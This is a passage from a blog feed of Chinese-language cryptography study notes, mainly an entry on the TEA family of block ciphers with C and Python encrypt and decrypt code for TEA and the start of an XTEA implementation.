punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span>               <span class="token number">0x48</span><span class="token punctuation">]</span>        result <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 将 32bit 拆分成 4x8bit，依次进行S盒变换</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>BOX<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">_rot_left</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""循环左移"""</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>n <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tea加密算法学习笔记</title>
      <link href="/2024/02/17/Tea%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/02/17/Tea%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="tea系列概述"><a class="markdownIt-Anchor" href="#tea系列概述"></a> TEA系列概述</h1><p>TEA系列概述：</p><p>TEA算法是由剑桥大学计算机实验室的 David Wheeler 和 Roger Needham于1994年发明，TEA 是Tiny Encryption Algorithm的缩写，以加密解密速度快，实现简单著称。</p><p>TEA 算法每一次可以操作 64bit(8byte)，采用 128bit(16byte) 作为 key，算法采用迭代的形式，推荐的迭代轮数是 64轮，最少 32 轮。</p><p>为解决 TEA 算法密钥表攻击的问题，TEA 算法先后经历了几次改进，从 XTEA 到 BLOCK TEA，直至最新的XXTEA。</p><p>XTEA 也称做 TEAN：</p><p>它使用与 TEA 相同的简单运算，但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。</p><p>Block TEA 算法可以对 32 位的任意整数倍长度的变量块进行加解密的操作：</p><p>该算法将 XTEA 轮循函数依次应用于块中的每个字，并且将它附加于被应用字的邻字。</p><p>XXTEA使用跟Block TEA相似的结构：</p><p>但在处理块中每个字时利用了相邻字，且用拥有两个输入量的 MX 函数代替了 XTEA 轮循函数。</p><p>上面提到的相邻字其实就是数组中相邻的项。</p><p>TEA 系列算法中均使用了一个 DELTA 常数，但 DELTA 的值对算法并无什么影响，只是为了避免不良的取值，推荐DELTA 的值取为黄金分割数 (5√-2)/2 与 232 的乘积，取整后的十六进制值为 0x9e3779B9，用于保证每一轮加密都不相同。</p><h1 id="tea加密"><a class="markdownIt-Anchor" href="#tea加密"></a> TEA加密</h1><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><p>TEA 采用与 DES 算法类似的 Feistel 结构，迭代的每次循环使用加法和移位操作，对明文和密钥进行扩散和混乱，实现明文的非线性变换。TEA 密钥长度和迭代次数都是 DES 的两倍，抗“试错法”攻击的强度不低于 DES 算法。算法以32bits 的字为运算单位，而不是耗费计算能力的逐位运算。算法没有采用 DES 那样的转换矩阵，它安全、高效、占用存储空间少，非常适合在嵌入式系统中应用</p><p><img src="https://s2.loli.net/2024/02/17/Un4jP7dvCicSOfs.png" alt="TEA流程" / loading="lazy"></p><h2 id="实现"><a class="markdownIt-Anchor" href="#实现"></a> 实现</h2><p>C语言版</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">encrypt</span> <span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">;</span>  <span class="token comment">//初始化变量 v0v1分别取输入数据的两个部分</span>    <span class="token class-name">uint32_t</span> delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span><span class="token punctuation">;</span>       <span class="token class-name">uint32_t</span> k0<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k1<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k2<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k3<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//从密钥中取出四个部分</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">32</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        sum<span class="token operator">+=</span>delta<span class="token punctuation">;</span>        v0<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k0<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k1<span class="token punctuation">)</span><span class="token punctuation">;</span>        v1<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k2<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span>    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sum<span class="token operator">=</span><span class="token number">0xc6ef3720</span><span class="token punctuation">,</span>i<span class="token punctuation">;</span> <span class="token comment">//sum是0x9e3778b9*32截取32位的结果</span>    <span class="token class-name">uint32_t</span> delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span><span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> k0<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k1<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k2<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k3<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">32</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v1<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k2<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//就是上面加密的过程逆过来</span>        v0<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k0<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k1<span class="token punctuation">)</span><span class="token punctuation">;</span>        sum<span class="token operator">-=</span>delta<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span>    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前的数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python版</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>    v0<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sum1<span class="token punctuation">.</span>value<span class="token operator">+=</span>delta        v0<span class="token punctuation">.</span>value<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">+</span>sum1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        v1<span class="token punctuation">.</span>value<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">+</span>sum1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span>v1<span class="token punctuation">.</span>value<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>    v0<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span>    sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>delta<span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>value<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">+</span>sum1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        v0<span class="token punctuation">.</span>value<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">+</span>sum1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        sum1<span class="token punctuation">.</span>value<span class="token operator">-=</span>delta    <span class="token keyword">return</span> v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span>v1<span class="token punctuation">.</span>value<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>    k<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密前的数据"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>    res<span class="token operator">=</span>encrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span>    res<span class="token operator">=</span>decrypt<span class="token punctuation">(</span>res<span class="token punctuation">,</span>k<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后的数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="xtea加密"><a class="markdownIt-Anchor" href="#xtea加密"></a> XTEA加密</h1><h2 id="介绍-2"><a class="markdownIt-Anchor" href="#介绍-2"></a> 介绍</h2><p>XTEA是TEA的升级版：</p><p>增加了更多的密钥表，移位和异或操作等等</p><p>增加了爆破key的难度，但是加密解密的逻辑还是一样的</p><p>下图为流程图</p><p><img src="https://s2.loli.net/2024/02/17/u6lfnQSC15dFzH4.png" alt="XTEA流程图" / loading="lazy"></p><h2 id="实现-2"><a class="markdownIt-Anchor" href="#实现-2"></a> 实现</h2><p>C语言版</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span> <span class="token keyword">void</span> <span class="token function">encipher</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>delta<span class="token operator">=</span><span class="token number">0x9E3779B9</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>num_rounds<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>v0<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v1<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum<span class="token operator">+</span>key<span class="token punctuation">[</span>sum<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sum<span class="token operator">+=</span>delta<span class="token punctuation">;</span>v1<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v0<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum<span class="token operator">+</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">void</span> <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>delta<span class="token operator">=</span><span class="token number">0x9E3779B9</span><span class="token punctuation">,</span>sum<span class="token operator">=</span>delta<span class="token operator">*</span>num_rounds<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>num_rounds<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>v1<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v0<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum<span class="token operator">+</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sum<span class="token operator">-=</span>delta<span class="token punctuation">;</span>v0<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v1<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum<span class="token operator">+</span>key<span class="token punctuation">[</span>sum<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint32_t</span> <span class="token keyword">const</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token 